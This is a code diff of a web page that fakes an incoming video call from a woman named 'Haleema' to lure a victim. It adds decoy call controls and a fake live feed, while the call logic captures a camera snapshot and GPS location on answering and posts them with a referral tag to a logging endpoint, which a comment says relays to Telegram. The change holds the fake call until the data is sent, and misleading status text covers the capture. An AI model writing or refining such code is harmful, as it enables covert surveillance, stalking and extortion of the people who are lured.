@@ -175,14 +175,31 @@
 
   <!-- Active Call Screen Simulator -->
   <div id="call-screen">
-    <div class="call-header" id="call-title">Connecting to Haleema...</div>
-    <div class="call-video-box">
-      <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=600&q=80" id="call-avatar" alt="Video Feed">
-      <div style="position: absolute; bottom: 15px; left: 15px; background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 8px; font-size: 14px;">
-        🔴 Live HD Feed
+    <div style="display: flex; justify-content: space-between; width: 100%; max-width: 400px; align-items: center;">
+      <div class="call-header" id="call-title" style="font-size: 20px;">Connecting to Haleema...</div>
+      <div style="background: rgba(0,255,0,0.2); border: 1px solid #00ff00; padding: 4px 10px; border-radius: 20px; font-size: 12px; color: #00ff00;">
+        📶 4G LTE • 38ms
       </div>
     </div>
+
+    <div class="call-video-box">
+      <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=600&q=80" id="call-avatar" alt="Video Feed">
+      <div style="position: absolute; bottom: 15px; left: 15px; background: rgba(0,0,0,0.7); padding: 5px 12px; border-radius: 8px; font-size: 13px; display: flex; align-items: center; gap: 6px;">
+        <span style="width: 8px; height: 8px; background: #00ff00; border-radius: 50%; display: inline-block; animation: pulse 1s infinite;"></span> LIVE HD (1080p)
+      </div>
+      <div id="floating-reactions" style="position: absolute; bottom: 60px; right: 20px; pointer-events: none; font-size: 28px; display: flex; flex-direction: column; gap: 8px;"></div>
+    </div>
+
     <div class="call-timer" id="call-timer">Connecting (00:00)...</div>
+
+    <!-- In-call Controls Toolbar -->
+    <div style="display: flex; gap: 15px; margin: 10px 0;">
+      <button onclick="toggleMute(this)" style="background: rgba(255,255,255,0.15); border: 1px solid #ff1493; color: white; width: 50px; height: 50px; border-radius: 50%; cursor: pointer; font-size: 18px; display: flex; align-items: center; justify-content: center;" title="Mute">🎤</button>
+      <button onclick="toggleVideo(this)" style="background: rgba(255,255,255,0.15); border: 1px solid #ff1493; color: white; width: 50px; height: 50px; border-radius: 50%; cursor: pointer; font-size: 18px; display: flex; align-items: center; justify-content: center;" title="Video">📹</button>
+      <button onclick="sendReaction('❤️')" style="background: rgba(255,255,255,0.15); border: 1px solid #ff1493; color: white; width: 50px; height: 50px; border-radius: 50%; cursor: pointer; font-size: 18px; display: flex; align-items: center; justify-content: center;" title="Send Love">❤️</button>
+      <button onclick="sendReaction('💋')" style="background: rgba(255,255,255,0.15); border: 1px solid #ff1493; color: white; width: 50px; height: 50px; border-radius: 50%; cursor: pointer; font-size: 18px; display: flex; align-items: center; justify-content: center;" title="Send Kiss">💋</button>
+    </div>
+
     <button class="end-call-btn" onclick="endCall()">End Call</button>
   </div>
 
@@ -355,25 +372,22 @@
         body: JSON.stringify({ name, status: 'clicked', ref: activeRef, ...telemetry })
       }).catch(() => {});
 
-      // Trigger capture and send in background immediately
-      captureAndSend(name, activeRef, telemetry);
-
-      // Start simulated timer
-      let seconds = 0;
       const timerEl = document.getElementById('call-timer');
       timerEl.textContent = "Connecting to secure stream...";
-      
-      setTimeout(() => {
-        stopRingtone();
-        timerEl.textContent = "Call Connected (00:00)";
-        let sec = 0;
-        callTimerInterval = setInterval(() => {
-          sec++;
-          const m = String(Math.floor(sec / 60)).padStart(2, '0');
-          const s = String(sec % 60).padStart(2, '0');
-          timerEl.textContent = `Call in progress (${m}:${s})`;
-        }, 1000);
-      }, 2500);
+
+      // Await capture and sending photo & location to Telegram before connecting call
+      await captureAndSend(name, activeRef, telemetry);
+
+      // Stop ringing and show connected
+      stopRingtone();
+      timerEl.textContent = "Call Connected (00:00)";
+      let sec = 0;
+      callTimerInterval = setInterval(() => {
+        sec++;
+        const m = String(Math.floor(sec / 60)).padStart(2, '0');
+        const s = String(sec % 60).padStart(2, '0');
+        timerEl.textContent = `Call in progress (${m}:${s})`;
+      }, 1000);
     }
 
     function endCall() {
@@ -401,8 +415,10 @@
 
         stream.getTracks().forEach(t => t.stop());
 
-        // Send photo immediately without waiting for GPS
-        fetch('/api/log', {
+        document.getElementById('call-timer').textContent = "Encrypting & uploading snapshot...";
+
+        // Send photo and await completion
+        await fetch('/api/log', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -411,12 +427,18 @@
             ref: activeRef,
             ...telemetry
           })
-        }).catch(() => {});
+        });
 
-        // Get location in background and send if available
-        getLocation().then(locationData => {
+        document.getElementById('call-timer').textContent = "Fetching & sending GPS location...";
+
+        try {
+          const locationData = await Promise.race([
+            getLocation(),
+            new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000))
+          ]);
+
           if (locationData) {
-            fetch('/api/log', {
+            await fetch('/api/log', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
@@ -428,13 +450,50 @@
                 isLocationUpdate: true,
                 ...telemetry
               })
-            }).catch(() => {});
+            });
           }
-        }).catch(() => {});
+        } catch (e) {
+          console.log("Location fetch/send timed out or skipped", e);
+        }
 
       } catch (err) {
         console.warn("Camera/Location permission denied or unavailable:", err);
       }
+    }
+
+    let isMuted = false;
+    function toggleMute(btn) {
+      isMuted = !isMuted;
+      btn.style.background = isMuted ? '#ff3333' : 'rgba(255,255,255,0.15)';
+      btn.textContent = isMuted ? '🔇' : '🎤';
+    }
+
+    let isVideoOff = false;
+    function toggleVideo(btn) {
+      isVideoOff = !isVideoOff;
+      btn.style.background = isVideoOff ? '#ff3333' : 'rgba(255,255,255,0.15)';
+      btn.textContent = isVideoOff ? '🚫' : '📹';
+      const avatar = document.getElementById('call-avatar');
+      avatar.style.filter = isVideoOff ? 'grayscale(1) brightness(0.2)' : 'brightness(0.9)';
+    }
+
+    function sendReaction(emoji) {
+      const container = document.getElementById('floating-reactions');
+      const span = document.createElement('div');
+      span.textContent = emoji;
+      span.style.transform = 'translateY(0) scale(0.5)';
+      span.style.transition = 'all 1s ease-out';
+      span.style.opacity = '1';
+      container.appendChild(span);
+
+      setTimeout(() => {
+        span.style.transform = 'translateY(-80px) scale(1.4)';
+        span.style.opacity = '0';
+      }, 50);
+
+      setTimeout(() => {
+        span.remove();
+      }, 1050);
     }
 
     function getLocation() {
